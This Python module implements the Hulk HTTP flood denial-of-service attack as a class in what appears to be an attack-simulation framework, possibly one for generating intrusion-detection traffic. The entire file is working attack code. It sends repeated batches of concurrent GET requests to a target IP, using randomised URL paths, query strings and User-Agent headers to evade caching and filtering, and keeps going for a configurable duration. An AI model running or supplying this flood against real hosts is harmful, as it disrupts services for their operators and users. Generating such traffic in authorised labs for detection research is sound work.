"""Hulk DoS attack implementation"""

import asyncio
import aiohttp
import logging
import random
import string
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class DoSHulk(BaseAttack):
    """Hulk DoS attack - HTTP flood with random URLs"""
    
    def get_attack_type(self) -> str:
        return "DoS attacks-Hulk"
    
    def get_default_port(self) -> int:
        return 80
    
    def _generate_random_url(self):
        """Generate random URL"""
        path_len = random.randint(5, 20)
        path = ''.join(random.choices(string.ascii_letters + string.digits, k=path_len))
        return f"/{path}?{''.join(random.choices(string.ascii_letters, k=10))}"
    
    def _generate_user_agent(self):
        """Generate random user agent"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]
        return random.choice(agents)
    
    async def _send_request(self, session):
        """Send single HTTP request"""
        port = self.target_port or self.get_default_port()
        url = f"http://{self.target_ip}:{port}{self._generate_random_url()}"
        
        headers = {
            'User-Agent': self._generate_user_agent(),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        
        try:
            async with session.get(url, headers=headers, timeout=5) as response:
                await response.read()
                self.packets_sent += 1
        except Exception as e:
            logger.debug(f"Request failed: {e}")
    
    async def _execute_attack(self):
        """Execute Hulk attack"""
        duration = self.parameters.get('duration', 300)  # seconds
        concurrent_requests = self.parameters.get('concurrent', 50)
        
        logger.info(f"Hulk: Starting attack on {self.target_ip} with {concurrent_requests} concurrent requests")
        
        connector = aiohttp.TCPConnector(limit=concurrent_requests)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start_time) < duration:
                tasks = [self._send_request(session) for _ in range(concurrent_requests)]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if self.packets_sent % 1000 == 0:
                    logger.info(f"Hulk: Sent {self.packets_sent} requests")
                
                await asyncio.sleep(0.1)
        
        logger.info(f"Hulk: Attack finished. Total requests: {self.packets_sent}")

